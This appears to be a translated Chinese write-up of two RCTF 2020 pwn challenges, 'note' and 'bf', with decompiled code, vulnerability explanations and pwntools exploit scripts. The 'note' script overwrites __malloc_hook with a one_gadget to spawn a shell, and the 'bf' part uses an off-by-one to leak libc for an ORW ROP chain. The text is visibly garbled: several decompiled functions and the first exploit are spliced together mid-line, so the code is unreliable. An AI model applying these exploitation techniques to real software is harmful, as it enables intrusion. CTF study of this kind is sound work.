# RCTF2020部分PWN题解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
上周肝了两天RCTF，最近闲下来好好做了下其中的几道题，这里写一下它们的题解
## note
###  程序逻辑
很典型的菜单题，bss处有个全局变量被设置为0x996，在New的时候会比较`0x359 *
sz和global_money`前者小于等于后者方可进行`calloc`分配，这里很明显可以通过`0x10000000000000000/0x359+1`进行绕过，当然，因为这个size过大，calloc分配失败会返回0，但是这里并不影响将这个`sz(__int64 a1@)
    {
      signed int idx; // [rsp-1Ch] [rbp-1Ch]
      __int64 sz; // [rsp-18h] [rbp-18h]
      __int64 chunk_addr; // [rsp-10h] [rbp-10h]
      __int64 v5; // [rsp-8h] [rbp-8h]
      __asm { endbr64 }
      v5 = a1;
      printf_0("Your money: %lldn");
      printf_0("Index: ");
      idx = read_int1((__int64)&v5);
      if ( idx > 13 || *((_QWORD *)&global_chunk_lis + 3 * idx) )
        return puts_0();
      printf_0("Size: ");
      sz = read_int1((__int64)&v5);
      if ( 0x359 * sz > (unsigned __int64)global_money )
        return puts_0();
      *((_QWORD *)&global_sz_list + 3 * idx) = sz;
      global_money_lis[3 * idx] = sz (__int64 a1@)
    {
      _QWORD *result; // rax
      signed int v2; // [rsp-Ch] [rbp-Ch]
      __int64 v3; // [rsp-8h] [rbp-8h]
      __asm { endbr64 }
      v3 = a1;
      printf_0("Index: ");
      v2 = read_int1((__int64)&v3);
      if ( v2 > 13 )
        return (_QWORD *)puts_0();
      free_0();
      global_money += global_money_lis[3 * v2];
      *((_QWORD *)&global_chunk_lis + 3 * v2) = 0LL;
      *((_QWORD *)&global_sz_list + 3 * v2) = 0LL;
      result = global_money_lis;
      global_money_lis[3 * v2] = 0LL;
      return result;
    }
继续看，这里main函数的判断判断了上界不超过7，可以发现这里选项6和7有两个后门。通过后门6可以构造chunk
overlapping，选项7可以溢出写0x20字节，进而可以覆写下一个堆块的size和fd(如果是空闲堆块)，可以利用它进行UAF。
    __int64 BackDoor_6()
    {
      __int64 v1; // [rsp-8h] [rbp-8h]
      __asm { endbr64 }
      if ( qword_4060 )
        return puts_0();
      if ( (unsigned __int64)global_money (__int64 a1@)
    {
      __int64 result; // rax
      int v2; // [rsp-Ch] [rbp-Ch]
      __int64 v3; // [rsp-8h] [rbp-8h]
      __asm { endbr64 }
      v3 = a1;
      puts_0();
      if ( dword_4018 != 1 )
        return puts_0();
      --dword_4018;
      printf_0("Index: ");
      result = read_int1((__int64)&v3);
      v2 = result;
      if ( (signed int)result  " + hex(libc_base))
        libc.address = libc_base
        Add(3,0xd0)
        Edit(3,'a'*0x60+p64(0)+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23)+'n')
        Add(0,0x60)
        Add(4,0x60)
        shell_addr = libc_base + gadgets[3]
        print hex(shell_addr)
        realloc = libc.sym['realloc']
        payload = 'a'*(0x13-8)
        payload += p64(shell_addr)
        payload += p64(realloc+8)
        Edit(4,payload+'n')
        #gdb.attach(p,'b*0x0000555555554000+0x15e0')
        Add(5,0x1)
        #Delete(4)
        p.interactive()
    exp()
## bf
###  程序逻辑
题目开了seccomp只能orw读flag。
这题模拟了`branfuck`解释器，用户输入的`code`会通过string的`allocator`，当输入code长度小于0x10时，会分配到栈上，大于的话就相当于调用malloc分配到堆上，此外还有一个`stack`供用户输入输出，其内存空间为固定大小`0x400`，根据反编译的结果可以看到`stack`后面紧挨着`code的地址`。
bf的代码可能直接看比较抽象，这里模拟了一下C语言的代码，写代码映射一下就好。
在代码中指针的加减操作均有界限检查，其中`stack_ptr`上限为`code_adddr`，下界为`stack_base`，但是这里在指针自增运算的检查中不够严谨，导致我们可以写到`code_addr`的最后一字节，从而改变了`code`的地址，可以将其改动`0xff`，这里`code_addr`和返回地址之间差值小于`0x40`，因此有机会改到返回地址从而布置rop进行orw。
    /*
    字符命令    等价的C语言
    >    ++ptr
     &input_buf )                 // off-bby-one
    {
        puts("invalid operation!");
        exit(-1);
    }
###  漏洞利用
这里我们利用`off-by-one`改动`code_addr`的低字节，改到返回地址处，从而在输出code的时候带出`__libc_start_main+231`，进而泄露Libc。注意我们需要将指针自增0x400，运用`[]`的循环操作输入`+[>+],.`，类似于下面代码，因为stack被初始化清空为0x400个空字节，因而可以循环0x400次，最终加到`code_addr`改其为返回地址。
    ++(*ptr);
    while(*ptr){
        ++ptr;
        ++(*ptr);
    }
    *ptr = getchar()；
    putchar(*ptr)；
之后我们通过二次输入布置rop到返回地址处(因为此时code地址被改到了返回地址)，同时通过上面的方式还原`code_addr`，否则析构函数会报错，从而orw读取flag。
###  exp.py
环境为2.27，我看到官方的wp里还泄露了初始code地址，我这里爆破了一下，多试几次就好。
    #coding=utf-8
    from pwn import *
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    context.update(arch='amd64',os='linux',log_level='DEBUG')
    context.terminal = ['tmux','split','-h']
    debug = 1
    elf = ELF('./bf')
    libc_offset = 0x3c4b20
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./bf')
    else:
        libc = ELF('./x64_libc.so.6')
        p = remote('f.buuoj.cn',20173)
    def exp():
        #leak libc
        p.recvuntil("enter your code:")
        payload = '+[>+],.'
        #gdb.attach(p,'b* 0x555555554000+0x1d2b')
        p.sendline(payload)